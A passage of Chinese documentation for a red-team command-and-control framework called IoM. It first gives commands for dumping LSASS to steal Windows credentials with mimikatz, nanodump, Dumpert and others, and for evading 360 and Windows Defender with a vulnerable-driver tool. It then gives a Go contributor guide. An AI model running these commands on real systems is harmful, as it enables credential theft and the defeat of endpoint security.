DumpLSASS","text":"<p>\u901a\u5e38\u5728\u63d0\u6743\u6216\u7ed5\u8fc7UAC\u540e\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u8bf8\u5982 Mimikatz \u6216 \u4e00\u4e9bDumpLSASS \u5de5\u5177\u6765\u83b7\u53d6 lsass.dmp\uff0c\u8fdb\u800c\u63d0\u53d6\u51ed\u636e\u3002\u672c\u6587\u5c06\u4e3b\u8981\u4e3e\u4f8b\u5982\u4f55\u5728 IOM \u73af\u5883\u4e2d\u7684\u7528\u6cd5\u3002</p>"},{"location":"IoM/guideline/advance/DumpLSASS/#\u4e00\u4e9b\u5e38\u89c1\u7684\u5bfc\u51fa\u65b9\u6cd5","title":"\u4e00\u4e9b\u5e38\u89c1\u7684\u5bfc\u51fa\u65b9\u6cd5","text":"<p>\u6309\u7167\u6267\u884c\u65b9\u5f0f\u4e3e\u4f8b</p>"},{"location":"IoM/guideline/advance/DumpLSASS/#pe","title":"PE","text":"<ul> <li>mimikatz</li> <li>procdump </li> <li>dumpert</li> <li>avdump</li> <li>sqldumper.exe</li> <li>\u7b49\u7b49</li> </ul> <p>\u4f60\u53ef\u4ee5\u4f7f\u7528execute_exe <pre><code>execute_exe \"D:\\TOOL\\iom_test\\mimikatz.exe\" -- log \"privilege::debug\" \"sekurlsa::logonPasswords full\" exit\n</code></pre> </p> <p>\u548cexecute_exe\u76f8\u6bd4, inline_exe\u7684\u9690\u853d\u6027\u4f1a\u66f4\u597d, \u4f46\u662f\u7a33\u5b9a\u6027\u65b9\u9762\u4e00\u4e9b\u4e0d\u7a33\u5b9a\u64cd\u4f5ccrash\u6216\u67e5\u6740\u4f1a\u5bfc\u81f4implant\u76f4\u63a5\u5d29\u6e83 <pre><code>inline_exe \"D:\\TOOL\\iom_test\\Outflank-Dumpert.exe\"\n</code></pre> </p>"},{"location":"IoM/guideline/advance/DumpLSASS/#c","title":"C#","text":"<ul> <li>DumpMinitool</li> <li>SharpDump</li> <li>\u7b49</li> </ul> <p>\u540c\u6837\u7684, \u4f60\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684execute_assembly\u548cinline_assembly\u6765\u6267\u884c <pre><code>execute_assembly \"C:\\Program Files\\dotnet\\sdk\\8.0.100\\Extensions\\dump\\DumpMinitool.exe\" -- --file lsass.dmp --processId &lt;pid&gt; --dumpType Full\ninline_assembly \"C:\\Program Files\\dotnet\\sdk\\8.0.100\\Extensions\\dump\\DumpMinitool.exe\" -- --file lsass.dmp --processId &lt;pid&gt; --dumpType Full\n</code></pre></p>"},{"location":"IoM/guideline/advance/DumpLSASS/#dll","title":"Dll","text":"<ul> <li>dumpert-dll</li> <li>comsvcs.dll</li> </ul> <pre><code>execute_dll \"D:\\c2\u6d4b\u8bd5\u76ee\u5f55\\Dumpert\\Dumpert-DLL\\x64\\Release\\Outflank-Dumpert-DLL.dll\" -e Dump\ninline_dll \"D:\\c2\u6d4b\u8bd5\u76ee\u5f55\\Dumpert\\Dumpert-DLL\\x64\\Release\\Outflank-Dumpert-DLL.dll\" -e Dump\n</code></pre>"},{"location":"IoM/guideline/advance/DumpLSASS/#bypass-360windows-defender","title":"Bypass 360/Windows Defender","text":"<p>\u4ee5\u4e0a\u5927\u591a\u6570\u65b9\u6cd5\u90fd\u5df2\u5931\u6548\uff0c360\u548cWindows Defender\u90fd\u4f1a\u76f4\u63a5\u67e5\u6740\uff0c\u4e00\u4e9b\u65e5\u5fd7\u76f8\u5173\u7ed3\u679c\u5982\u4e0b:</p> <ol> <li> <p>\u6587\u4ef6\u843d\u5730\u6267\u884c\u76f4\u63a5\u67e5\u6740</p> </li> <li> <p>\u727a\u7272\u8fdb\u7a0b\u6ce8\u5165\u67e5\u6740</p> </li> <li> <p>\u8bfb\u53d6LSASS\u654f\u611f\u4fe1\u606f\u67e5\u6740</p> </li> <li> <p>\u68c0\u6d4b\u5230lsass.dmp\u6587\u4ef6\u8f6c\u5b58\u50a8\u5230\u4e86\u672c\u5730\u78c1\u76d8\u7684\u67e5\u6740lsass.dmp\u6587\u4ef6\u672c\u8eab</p> </li> </ol> <p>360\u6838\u6676, \u9644\u622a\u56fe</p> <p>Windows Defender , \u9644\u622a\u56fe</p> <p>\u4e0b\u9762\u4ecb\u7ecd\u51e0\u4e2abypass\u65b9\u6cd5\u3002</p>"},{"location":"IoM/guideline/advance/DumpLSASS/#edrsandblast","title":"EDRSandblast","text":"<p>EDRSandBlast\u662f\u4e00\u4e2a\u7528C\u7f16\u5199\u7684\u5de5\u5177\uff0c\u53ef\u5c06\u6613\u53d7\u653b\u51fb\u7684\u7b7e\u540d\u9a71\u52a8\u7a0b\u5e8f\u6b66\u5668\u5316\u4ee5\u7ed5\u8fc7 EDR \u68c0\u6d4b\uff08\u901a\u77e5\u4f8b\u7a0b\u56de\u8c03\u3001\u5bf9\u8c61\u56de\u8c03\u548cETW TI\u63d0\u4f9b\u7a0b\u5e8f\uff09\u548cLSASS\u4fdd\u62a4\u3002\u8fd8\u5b9e\u65bd\u4e86\u591a\u79cd\u7528\u6237\u6001\u8131\u94a9\u6280\u672f\u6765\u9003\u907f\u7528\u6237\u6001\u76d1\u63a7\u3002</p> <p>\u7ecf\u8fc7\u6d4b\u8bd5wd\u53ef\u4ee5\u8fc7</p> <pre><code>mkdir \"C:\\temp\"\ncd \"C:\\temp\"\nupload \"D:\\EDRSandblast\\x64\\Release\\gdrv.sys\" \"C:\\temp\\gdrv.sys\"\nexecute_exe \"D:\\EDRSandblast\\x64\\Release\\EDRSandblast_LsassDump.exe\"\n</code></pre> <p></p> <p></p>"},{"location":"IoM/guideline/advance/DumpLSASS/#nanodump","title":"NanoDump","text":"<p>nanodump\u662f\u4e00\u4e2a\u4e00\u79cd\u7075\u6d3b\u7684\u5de5\u5177\uff0c\u53ef\u521b\u5efa LSASS \u8fdb\u7a0b\u7684\u5c0f\u578b\u8f6c\u50a8</p> <p>\u7ecf\u6d4b\u8bd5\uff0c\u6838\u6676\u548cwindows defender\u90fd\u65e0\u611f\u3002</p> <ol> <li> <p>\u901a\u8fc7fork\u95f4\u63a5\u8bfb\u53d6 LSASS ,\u5e76\u4f7f\u7528\u65e0\u6548\u7b7e\u540d\u5c06\u8f6c\u50a8\u5199\u5165\u5230\u76ee\u6807\u673a\u5668\u78c1\u76d8 <pre><code>nanodump -- --fork --write \"C:\\lsass.dmp\"\n.\\restore_signature.exe lsass.dmp\npython -m pypykatz lsa minidump lsass.dmp\n</code></pre> </p> </li> <li> <p>\u4f7f\u7528 seclogon Leak Remote \u5728\u8bb0\u4e8b\u672c\u8fdb\u7a0b\u4e2d\u6cc4\u6f0f LSASS \u53e5\u67c4\uff0c\u590d\u5236\u8be5\u53e5\u67c4\u4ee5\u8bbf\u95ee LSASS\uff0c\u7136\u540e\u901a\u8fc7\u521b\u5efa\u5206\u53c9\u5e76\u4f7f\u7528\u6709\u6548\u7b7e\u540d(--valid)\uff0c\u4e0b\u8f7d\u8f6c\u50a8\u6765\u95f4\u63a5\u8bfb\u53d6\u5b83 <pre><code>nanodump -- --seclogon-leak-remote \"C:\\Windows\\notepad.exe\" --fork --valid\n</code></pre> </p> </li> </ol>"},{"location":"IoM/guideline/advance/DumpLSASS/#minidumpwritedump","title":"MiniDumpWriteDump","text":"<p>360\u6838\u6676\u548cwd\u90fd\u65e0\u611f\uff0c\u4f46\u662f\u672c\u5730\u6d4b\u8bd5\u65f6\u6b64\u65b9\u6cd5\u4f1a\u751f\u6210\u66f4\u5927\u7684\u8f6c\u50a8\u6587\u4ef6\u7ea660M (nanodump\u7684\u6587\u4ef610M) <pre><code>bof \"D:\\BOFs\\MiniDumpWriteDump\\minidumpwritedump.x64.o\" -- int:648 str:\"C:\\lsass.dmp\"\n</code></pre></p> <p></p>"},{"location":"IoM/guideline/advance/DumpLSASS/#\u5176\u4ed6","title":"\u5176\u4ed6:","text":"<p>\u5bf9\u4e8eUAC\u548c\u63d0\u6743\u65b9\u9762\uff0ciom\u76ee\u524d\u4e5f\u5df2\u7ecf\u652f\u6301\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684\u63d2\u4ef6\uff0c\u5982UAC bypass\u3001ElevateKit\u7b49\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002</p> <p>\u7528\u4e8e\u63d0\u6743\u7684 ElevateKit \u63d0\u6743\u622a\u56fe\u793a\u4f8b\u5982\u4e0b:</p> <p></p> <p>UAC Bypass\u622a\u56fe:</p> <p></p>"},{"location":"IoM/guideline/advance/DumpLSASS/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>https://github.com/fortra/nanodump</li> <li>https://github.com/rookuu/BOFs</li> <li>https://github.com/wavestone-cdt/EDRSandblast</li> <li>https://github.com/outflanknl/Dumpert</li> <li>https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools</li> <li>https://3gstudent.github.io</li> <li>https://redsiege.com/blog/2024/03/dumping-lsass-like-its-2019/</li> <li>...</li> </ul>"},{"location":"IoM/guideline/develop/","title":"IoM \u5f00\u53d1\u8005\u8d21\u732e\u6307\u5357","text":"<p>\u6b22\u8fce\u8d21\u732e Internet of Malice (IoM) \u9879\u76ee\uff01IoM \u81f4\u529b\u4e8e\u6210\u4e3a\u5f00\u653e\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\uff0c\u6211\u4eec\u6b22\u8fce\u6765\u81ea\u793e\u533a\u7684\u8d21\u732e\u3002</p> <p>\u5408\u89c4\u63d0\u9192</p> <p>\u5728\u5f00\u59cb\u8d21\u732e\u4e4b\u524d\uff0c\u8bf7\u4ed4\u7ec6\u9605\u8bfb\u5e76\u7406\u89e3\u6211\u4eec\u7684\u7528\u6237\u534f\u8bae\u3002\u6240\u6709\u8d21\u732e\u90fd\u5fc5\u987b\u9075\u5faa\u6cd5\u5f8b\u6cd5\u89c4\uff0c\u4ec5\u7528\u4e8e\u6388\u6743\u7684\u5b89\u5168\u6d4b\u8bd5\u548c\u7814\u7a76\u3002</p>"},{"location":"IoM/guideline/develop/#\u53ef\u62d3\u5c55\u7684\u7ec4\u4ef6","title":"\u53ef\u62d3\u5c55\u7684\u7ec4\u4ef6","text":"<p>IoM\u91c7\u7528\u9ad8\u5ea6\u6a21\u5757\u5316\u7684\u8bbe\u8ba1\uff0c\u652f\u6301\u591a\u79cd\u62d3\u5c55\u65b9\u5f0f\uff1a</p> <ul> <li>Command: \u5ba2\u6237\u7aef\u547d\u4ee4\u62d3\u5c55 (\u63a8\u8350)</li> <li>RPC: \u670d\u52a1\u7aef\u63a5\u53e3\u62d3\u5c55  </li> <li>Module: \u690d\u5165\u7269\u529f\u80fd\u62d3\u5c55</li> <li>Mal\u63d2\u4ef6: Lua\u811a\u672c\u62d3\u5c55</li> </ul>"},{"location":"IoM/guideline/develop/#\u5f00\u53d1\u5bfc\u822a","title":"\u5f00\u53d1\u5bfc\u822a","text":"<p>\u6839\u636e\u4f60\u7684\u8d21\u732e\u65b9\u5411\u9009\u62e9\u5bf9\u5e94\u6307\u5357\uff1a</p> \u5ba2\u6237\u7aef\u5f00\u53d1Server\u5f00\u53d1Implant\u5f00\u53d1 <p>Client\u5f00\u53d1 - \u7528\u6237\u754c\u9762\u548c\u547d\u4ee4</p> <ul> <li>\u65b0\u547d\u4ee4\u5f00\u53d1 (\u57fa\u4e8eCobra)</li> <li>\u53c2\u6570\u89e3\u6790\u548c\u81ea\u52a8\u8865\u5168</li> <li>\u754c\u9762\u4ea4\u4e92\u4f18\u5316</li> </ul> <p>\ud83d\udc49 Client\u5f00\u53d1\u6307\u5357</p> <p>Server\u5f00\u53d1 - \u6838\u5fc3\u903b\u8f91\u548c\u6570\u636e\u5904\u7406</p> <ul> <li>RPC\u63a5\u53e3\u5f00\u53d1</li> <li>Parser\u6269\u5c55 </li> <li>Pipeline\u62d3\u5c55</li> </ul> <p>\ud83d\udc49 Server\u5f00\u53d1\u6307\u5357</p> <p>Implant\u5f00\u53d1 - \u690d\u5165\u7269\u548c\u6a21\u5757</p> <ul> <li>Module\u5f00\u53d1 (Rust)</li> </ul> <p>\ud83d\udc49 Implant\u5f00\u53d1\u6307\u5357</p>"},{"location":"IoM/guideline/develop/#\u8d21\u732e\u89c4\u8303","title":"\u8d21\u732e\u89c4\u8303","text":""},{"location":"IoM/guideline/develop/#pull-request\u8981\u6c42","title":"Pull Request\u8981\u6c42","text":"<p>\u63d0\u4ea4PR\u65f6\u8bf7\u9075\u5faa\u4ee5\u4e0b\u89c4\u8303\uff1a</p> <ul> <li>\u529f\u80fd\u63cf\u8ff0<ul> <li>\u6e05\u6670\u63cf\u8ff0\u6dfb\u52a0\u7684\u529f\u80fd\u548c\u89e3\u51b3\u7684\u95ee\u9898</li> <li>\u8bf4\u660e\u5b9e\u73b0\u65b9\u6848\u548c\u6280\u672f\u9009\u578b</li> <li>\u5217\u51fa\u76f8\u5173\u7684\u4f9d\u8d56\u53d8\u66f4</li> </ul> </li> <li>\u6d4b\u8bd5\u8981\u6c42<ul> <li>\u63d0\u4f9b\u529f\u80fd\u9a8c\u8bc1\u6b65\u9aa4</li> </ul> </li> <li>\u4ee3\u7801\u8d28\u91cf<ul> <li>\u9075\u5faa\u9879\u76ee\u4ee3\u7801\u89c4\u8303</li> <li>\u901a\u8fc7\u4ee3\u7801\u683c\u5f0f\u68c0\u67e5</li> <li>\u65e0\u660e\u663e\u7684\u6027\u80fd\u95ee\u9898</li> </ul> </li> </ul>"},{"location":"IoM/guideline/develop/#\u63d0\u4ea4\u6a21\u677f","title":"\u63d0\u4ea4\u6a21\u677f","text":"<pre><code>## \u529f\u80fd\u63cf\u8ff0\n\u7b80\u8981\u63cf\u8ff0\u8fd9\u4e2aPR\u7684\u76ee\u7684\u548c\u529f\u80fd\n\n## \u5b9e\u73b0\u65b9\u6848\n\u63cf\u8ff0\u5177\u4f53\u7684\u5b9e\u73b0\u65b9\u6848\u548c\u6280\u672f\u7ec6\u8282\n\n## \u6d4b\u8bd5\u9a8c\u8bc1\n\u624b\u52a8\u529f\u80fd\u9a8c\u8bc1\u5b8c\u6210\n\n## \u76f8\u5173Issue\nFixes #[issue\u7f16\u53f7]\n</code></pre>"},{"location":"IoM/guideline/develop/#\u76f8\u5173\u8d44\u6e90","title":"\u76f8\u5173\u8d44\u6e90","text":""},{"location":"IoM/guideline/develop/#\u6587\u6863\u94fe\u63a5","title":"\u6587\u6863\u94fe\u63a5","text":"<ul> <li>IoM\u8bbe\u8ba1\u6587\u6863 - \u67b6\u6784\u8bbe\u8ba1\u7406\u5ff5</li> <li>\u67b6\u6784\u6982\u5ff5 - \u6838\u5fc3\u6982\u5ff5\u8bf4\u660e</li> <li>\u7528\u6237\u624b\u518c - \u5b8c\u6574\u4f7f\u7528\u6307\u5357</li> <li>API\u6587\u6863 - \u534f\u8bae\u5b9a\u4e49</li> </ul>"},{"location":"IoM/guideline/develop/#\u8054\u7cfb\u65b9\u5f0f","title":"\u8054\u7cfb\u65b9\u5f0f","text":"<ul> <li>Issues: \u5404\u4ed3\u5e93Issues\u9875\u9762\u53cd\u9988\u6280\u672f\u95ee\u9898</li> <li>Discussions: GitHub\u8ba8\u8bba\u533a\u4ea4\u6d41\u8bbe\u8ba1\u60f3\u6cd5</li> <li>\u90ae\u7bb1: m09ician@gmail.com</li> <li>\u5fae\u4fe1\u7fa4: \u8054\u7cfb\u90ae\u7bb1\u83b7\u53d6\u5165\u7fa4\u9080\u8bf7</li> </ul> <p>\u611f\u8c22\u60a8\u5bf9IoM\u9879\u76ee\u7684\u8d21\u732e\uff01</p>"},{"location":"IoM/guideline/develop/client/","title":"Client \u5f00\u53d1\u6307\u5357","text":"<p>\u672c\u6307\u5357\u4ecb\u7ecd\u5982\u4f55\u4e3aIoM\u7684Client\u7ec4\u4ef6\u8fdb\u884c\u5f00\u53d1\u548c\u8d21\u732e\u3002Client\u662f\u7528\u6237\u4e0eIoM\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e3b\u8981\u754c\u9762\u3002</p> <p>\u56de\u5230\u603b\u89c8</p> <p>\u8fd4\u56de\u5f00\u53d1\u8005\u8d21\u732e\u6307\u5357 | \u67e5\u770bServer\u5f00\u53d1\u6307\u5357 | \u67e5\u770bImplant\u5f00\u53d1\u6307\u5357</p>"},{"location":"IoM/guideline/develop/client/#\u73af\u5883\u914d\u7f6e","title":"\u73af\u5883\u914d\u7f6e","text":"<p>\u73af\u5883\u914d\u7f6eclient\u4e0eserver\u5b8c\u5168\u4e00\u81f4\uff0c \u6309\u9700\u53d6\u7528</p> Go\u5f00\u53d1\u73af\u5883 <p>\u7248\u672c\u8981\u6c42: Go &gt;= 1.20</p> <p>\u63a8\u8350golang 1.20</p> <p>golang 1.20\u662f\u517c\u5bb9Win7\u7684\u6700\u540e\u4e00\u4e2a\u7248\u672c</p> <pre><code>go version\n</code></pre> protobuf\u73af\u5883 LinuxmacOSWindows <p>\u4f7f\u7528 <code>apt</code> \u6216 <code>apt-get</code>: <pre><code>apt install -y protobuf-compiler \nprotoc --version  # \u786e\u4fdd\u7248\u672c &gt;= 3\n</code></pre></p> <p>\u4f7f\u7528 Homebrew: <pre><code>brew install protobuf\nprotoc --version\n</code></pre></p> <p>\u4f7f\u7528 Winget: <pre><code>winget install protobuf \nprotoc --version\n</code></pre></p> <p>protobuf Go\u63d2\u4ef6 (\u6307\u5b9a\u7248\u672c) <pre><code>go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.3.0  \ngo install google.golang.org/protobuf/cmd/protoc-gen-go@v1.34.1  \n</code></pre></p> <p>\u53c2\u8003\u5b98\u65b9\u6587\u6863</p> <p>\u66f4\u591a\u5b89\u88c5\u9009\u9879\u8bf7\u53c2\u8003 protobuf.dev/installation</p> \u9879\u76ee\u8bbe\u7f6e <ol> <li> <p>Fork\u5e76\u514b\u9686\u4ed3\u5e93 <pre><code>git clone --recurse-submodules https://github.com/your-username/malice-network.git\ncd malice-network\ngit remote add upstream https://github.com/chainreactors/malice-network.git\n</code></pre></p> </li> <li> <p>\u5b89\u88c5\u4f9d\u8d56 <pre><code>go mod tidy\n</code></pre></p> </li> <li> <p>\u751f\u6210protobuf\u6587\u4ef6 (\u5982\u679c\u4fee\u6539\u4e86proto\u5b9a\u4e49)    <pre><code>go generate ./client\n</code></pre></p> </li> <li> <p>\u7f16\u8bd1server <pre><code>go build ./client/\n</code></pre></p> </li> </ol>"},{"location":"IoM/guideline/develop/client/#client\u67b6\u6784","title":"Client\u67b6\u6784","text":""},{"location":"IoM/guideline/develop/client/#\u6838\u5fc3\u529f\u80fd","title":"\u6838\u5fc3\u529f\u80fd","text":""},{"location":"IoM/guideline/develop/client/#\u63d2\u4ef6\u7ba1\u7406","title":"\u63d2\u4ef6\u7ba1\u7406","text":"<p>Client\u652f\u6301\u591a\u79cd\u63d2\u4ef6\u7ba1\u7406\u7cfb\u7edf\uff1a</p> <ul> <li>mal: IoM\u652f\u6301\u7684\u63d2\u4ef6\u8bed\u8a00\u5e26\u6765\u7684\u62d3\u5c55\u80fd\u529b\uff0c\u5f53\u524d\u652f\u6301lua</li> <li>addon: \u5185\u5b58\u4e2d\u4fdd\u5b58\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u907f\u514d\u91cd\u590d\u4f20\u8f93</li> <li>module: \u52a8\u6001\u52a0\u8f7d\u7684implant module</li> <li>alias: sliver\u4e2d\u7684alias\uff0c\u4e3b\u8981\u7528\u6765\u7ba1\u7406CLR\u4e0eUDRL\u7684DLL\u7a0b\u5e8f</li> <li>extension: sliver\u4e2d\u7684extension\uff0c\u4e3b\u8981\u7528\u6765\u7ba1\u7406BOF\u4e0esliver\u7279\u5b9a\u683c\u5f0f\u7684dll</li> <li>armory: sliver\u7684\u63d2\u4ef6\u5305\u7ba1\u7406\u5de5\u5177</li> </ul> <p>\u8fd9\u4e9b\u52a8\u6001\u62d3\u5c55\u7684\u63d2\u4ef6\u53ef\u4ee5\u6ee1\u8db3\u7edd\u5927\u90e8\u5206\u573a\u666f\uff0c \u4f46\u5bf9\u4e8e\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\uff0c\u6216\u8005\u9700\u8981\u6210\u4e3a\u901a\u7528\u80fd\u529b\u7684\u529f\u80fd\uff0c\u9700\u8981\u6ce8\u518c\u5230command\u4e2d\u3002 \u672c\u6587\u6863\u4e3b\u8981\u5e2e\u52a9\u60f3\u8981\u6dfb\u52a0\u65b0\u7684command</p>"},{"location":"IoM/guideline/develop/client/#\u5f00\u53d1\u5b9e\u8df5","title":"\u5f00\u53d1\u5b9e\u8df5","text":"<p>IoM\u7684\u547d\u4ee4\u5f00\u53d1\u57fa\u4e8e\u4e09\u4e2a\u4e3b\u8981\u62d3\u5c55\u65b9\u5f0f\uff1aCommand\u3001RPC\u3001Module\u3002</p>"},{"location":"IoM/guideline/develop/client/#command\u5f00\u53d1","title":"Command\u5f00\u53d1","text":"<p>\u5305\u542b\u56db\u4e2a\u6b65\u9aa4\uff1a</p>"},{"location":"IoM/guideline/develop/client/#1-\u7f16\u5199\u529f\u80fd\u51fd\u6570","title":"1. \u7f16\u5199\u529f\u80fd\u51fd\u6570","text":"<p>\u529f\u80fd\u51fd\u6570\u4e13\u6ce8\u4e8e\u4e1a\u52a1\u903b\u8f91\uff0c\u4e0e\u5177\u4f53\u547d\u4ee4\u63a5\u53e3\u89e3\u8026\uff1a</p> <pre><code>func Env(rpc clientrpc.MaliceRPCClient, session *core.Session) (*clientpb.Task, error) {\n    task, err := rpc.Env(session.Context(), &amp;implantpb.Request{\n        Name: consts.ModuleEnv,\n    })\n    if err != nil {\n        return nil, err\n    }\n    return task, err\n}\n</code></pre>"},{"location":"IoM/guideline/develop/client/#2-\u7f16\u5199\u547d\u4ee4\u5305\u88c5\u51fd\u6570","title":"2. \u7f16\u5199\u547d\u4ee4\u5305\u88c5\u51fd\u6570","text":"<p>\u5c06\u529f\u80fd\u51fd\u6570\u5305\u88c5\u4e3aCobra\u547d\u4ee4\u5904\u7406\u51fd\u6570\uff1a</p> <pre><code>func EnvCmd(cmd *cobra.Command, con *repl.Console) error {\n    session := con.GetInteractive()\n    task, err := Env(con.Rpc, session)\n    if err != nil {\n        return err\n    }\n    session.Console(task, string(*con.App.Shell().Line()))\n    return nil\n}\n</code></pre>"},{"location":"IoM/guideline/develop/client/#3-\u6ce8\u518c\u5230mal\u63d2\u4ef6\u7cfb\u7edf","title":"3. \u6ce8\u518c\u5230Mal\u63d2\u4ef6\u7cfb\u7edf","text":"<p>\u5c06\u529f\u80fd\u6ce8\u518c\u5230mal\u63d2\u4ef6\u7cfb\u7edf\u548c\u5168\u5c40callback\u4e2d\uff1a</p> <pre><code>func RegisterEnvFunc(con *repl.Console) {\n    con.RegisterImplantFunc(\n        consts.ModuleEnv,\n        Env,\n        \"benv\", // mal\u4e2d\u7684\u522b\u540d\n        func(rpc clientrpc.MaliceRPCClient, sess *core.Session) (*clientpb.Task, error) {\n            return Env(rpc, sess)\n        },\n        output.ParseKVResponse,    // \u89e3\u6790\u51fd\u6570\n        output.FormatKVResponse)   // \u683c\u5f0f\u5316\u51fd\u6570\n\n    con.AddCommandFuncHelper(\n        consts.ModuleEnv,\n        consts.ModuleEnv,\n        \"env(active())\",\n        []string{\n            \"sess: special session\",\n        },\n        []string{\"task\"})\n}\n</code></pre>"},{"location":"IoM/guideline/develop/client/#4-\u5b9a\u4e49cobra\u547d\u4ee4","title":"4. \u5b9a\u4e49Cobra\u547d\u4ee4","text":"<p>\u5728<code>commands.go</code>\u4e2d\u5b9a\u4e49Cobra\u547d\u4ee4\u63a5\u53e3\uff1a</p> <pre><code>envCmd := &amp;cobra.Command{\n    Use:   consts.ModuleEnv,\n    Short: \"List environment variables\",\n    RunE: func(cmd *cobra.Command, args []string) error {\n        if len(args) == 0 {\n            return EnvCmd(cmd, con)\n        } else {\n            return fmt.Errorf(\"unknown cmd '%s'\", args[0])\n        }\n    },\n    Annotations: map[string]string{\n        \"depend\": consts.ModuleEnv,\n        \"ttp\":    \"T1134\",\n    },\n}\n</code></pre>"},{"location":"IoM/guideline/develop/client/#\u5206\u5c42\u67b6\u6784\u4f18\u52bf","title":"\u5206\u5c42\u67b6\u6784\u4f18\u52bf","text":"<p>\u8fd9\u79cd\u5206\u5c42\u8bbe\u8ba1\u5e26\u6765\u4ee5\u4e0b\u4f18\u52bf\uff1a</p> <ol> <li>\u529f\u80fd\u590d\u7528: \u529f\u80fd\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u63a5\u53e3\u8c03\u7528</li> <li>\u6d4b\u8bd5\u53cb\u597d: \u53ef\u4ee5\u5355\u72ec\u6d4b\u8bd5\u4e1a\u52a1\u903b\u8f91</li> <li>\u63d2\u4ef6\u96c6\u6210: \u81ea\u52a8\u96c6\u6210\u5230mal\u63d2\u4ef6\u7cfb\u7edf</li> <li>\u7c7b\u578b\u5b89\u5168: \u901a\u8fc7\u5f3a\u7c7b\u578b\u786e\u4fdd\u63a5\u53e3\u4e00\u81f4\u6027</li> </ol>"},{"location":"IoM/guideline/develop/client/#\u53c2\u6570\u5904\u7406\u6a21\u5f0f","title":"\u53c2\u6570\u5904\u7406\u6a21\u5f0f","text":""},{"location":"IoM/guideline/develop/client/#\u7b80\u5355\u53c2\u6570","title":"\u7b80\u5355\u53c2\u6570","text":"<pre><code>func SimpleCmd(cmd *cobra.Command, con *repl.Console) error {\n    param := cmd.Flags().Arg(0) // \u83b7\u53d6\u4f4d\u7f6e\u53c2\u6570\n    session := con.GetInteractive()\n    task, err := SimpleFunc(con.Rpc, session, param)\n    // ...\n}\n</code></pre>"},{"location":"IoM/guideline/develop/client/#\u590d\u6742\u53c2\u6570","title":"\u590d\u6742\u53c2\u6570","text":"<pre><code>func ComplexCmd(cmd *cobra.Command, con *repl.Console) error {\n    flag1, _ := cmd.Flags().GetString(\"flag1\")\n    flag2, _ := cmd.Flags().GetBool(\"flag2\")\n    session := con.GetInteractive()\n    task, err := ComplexFunc(con.Rpc, session, flag1, flag2)\n    // ...\n}\n</code></pre>"},{"location":"IoM/guideline/develop/client/#\u547d\u4ee4\u5f00\u53d1\u8981\u70b9","title":"\u547d\u4ee4\u5f00\u53d1\u8981\u70b9","text":""},{"location":"IoM/guideline/develop/client/#annotations\u6807\u6ce8","title":"Annotations\u6807\u6ce8","text":"<ul> <li>depend: \u6307\u5b9a\u4f9d\u8d56\u7684Module\u540d\u79f0</li> <li>ttp: MITRE ATT&amp;CK\u6280\u672fID</li> <li>\u5176\u4ed6: \u53ef\u4ee5\u6dfb\u52a0\u81ea\u5b9a\u4e49\u6807\u6ce8</li> </ul>"},{"location":"IoM/guideline/develop/client/#\u53c2\u6570\u5904\u7406","title":"\u53c2\u6570\u5904\u7406","text":"<ul> <li>\u4f7f\u7528<code>cobra.ExactArgs(n)</code>\u9650\u5236\u53c2\u6570\u6570\u91cf</li> <li>\u4f7f\u7528<code>cmd.Flags().Arg(index)</code>\u83b7\u53d6\u4f4d\u7f6e\u53c2\u6570</li> <li>\u4f7f\u7528<code>cmd.Flags().GetString(\"flag\")</code>\u83b7\u53d6\u6807\u5fd7\u53c2\u6570</li> </ul>"},{"location":"IoM/guideline/develop/client/#\u590d\u6742\u53c2\u6570\u8865\u5168\u793a\u4f8b","title":"\u590d\u6742\u53c2\u6570\u8865\u5168\u793a\u4f8b","text":"<p>\u4ee5HTTP Pipeline\u547d\u4ee4\u4e3a\u4f8b\uff0c\u5c55\u793a\u5b8c\u6574\u7684\u53c2\u6570\u5904\u7406\u548c\u8865\u5168\u673a\u5236\uff1a</p> <pre><code>// \u521b\u5efa\u590d\u6742\u547d\u4ee4\nhttpCmd := &amp;cobra.Command{\n    Use:   consts.HTTPPipeline,\n    Short: \"Register a new HTTP pipeline and start it\",\n    Long:  \"Register a new HTTP pipeline with the specified listener.\",\n    RunE: func(cmd *cobra.Command, args []string) error {\n        return NewHttpPipelineCmd(cmd, con)\n    },\n    Args: cobra.MaximumNArgs(1),\n    Example: `~~~\n// Register an HTTP pipeline with the default settings\nhttp --listener http_default\n\n// Register an HTTP pipeline with custom headers and error page\nhttp --name http_test --listener http_default --host 192.168.0.43 --port 8080 --headers \"Content-Type=text/html\" --error-page /path/to/error.html\n\n// Register an HTTP pipeline with TLS enabled\nhttp --listener http_default --tls --cert_path /path/to/cert --key_path /path/to/key\n~~~`,\n}\n\n// \u7ed1\u5b9a\u591a\u7ec4\u6807\u5fd7\u4f4d\ncommon.BindFlag(httpCmd, \n    common.PipelineFlagSet,    // \u57fa\u7840pipeline\u6807\u5fd7\n    common.TlsCertFlagSet,     // TLS\u8bc1\u4e66\u6807\u5fd7\n    common.SecureFlagSet,      // \u5b89\u5168\u76f8\u5173\u6807\u5fd7\n    common.EncryptionFlagSet,  // \u52a0\u5bc6\u76f8\u5173\u6807\u5fd7\n    func(f *pflag.FlagSet) {   // \u81ea\u5b9a\u4e49\u6807\u5fd7\n        httpCmd.Flags().StringToString(\"headers\", nil, \"HTTP response headers (key=value)\")\n        httpCmd.Flags().String(\"error-page\", \"\", \"Path to custom error page file\")\n    })\n\n// \u7ed1\u5b9a\u53c2\u6570\u8865\u5168\ncommon.BindFlagCompletions(httpCmd, func(comp carapace.ActionMap) {\n    comp[\"listener\"] = common.ListenerIDCompleter(con)\n    comp[\"host\"] = carapace.ActionValues().Usage(\"http host\")\n    comp[\"port\"] = carapace.ActionValues().Usage(\"http port\")\n    comp[\"cert\"] = carapace.ActionFiles().Usage(\"path to the cert file\")\n    comp[\"key\"] = carapace.ActionFiles().Usage(\"path to the key file\")\n    comp[\"tls\"] = carapace.ActionValues().Usage(\"enable tls\")\n    comp[\"error-page\"] = 